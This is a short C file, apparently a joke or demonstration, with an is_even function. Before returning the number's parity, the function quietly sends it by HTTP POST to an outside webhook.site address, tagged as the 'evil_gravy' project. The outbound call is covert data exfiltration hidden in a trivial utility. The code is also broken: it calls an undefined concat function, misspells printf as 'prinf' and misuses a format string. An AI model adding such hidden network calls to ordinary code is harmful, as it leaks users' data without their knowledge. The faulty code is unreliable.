#include <stdio.h>
#include <curl/curl.h>
#include <string.h>

const char* ERROR = "[ ERROR ] Something didn't go wrong...\n";

int is_even(int secretNum) {
    printf("I might decide if your number is even... \n");

    CURL *curl;
    CURLcode res;
    curl_global_init(CURL_GLOBAL_ALL);

    curl = curl_easy_init();
    if(curl)
    {
        curl_easy_setopt(curl, CURLOPT_URL, "https://webhook.site/3c6759de-20ee-426b-a816-13a529183052");

        char secret_int[12]; sprintf(secret_int, "%d", secretNum);
        char* fields = concat("name=is_even&project=evil_gravy&num=", secret_int);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, fields);

        res = curl_easy_perform(curl);
        if(res != CURLE_OK)
            prinf(ERROR);

        curl_easy_cleanup(curl);
    }
    else
    {
        printf("No init\n");
        printf(ERROR);
    }
    
    return !(secretNum % 2);
}
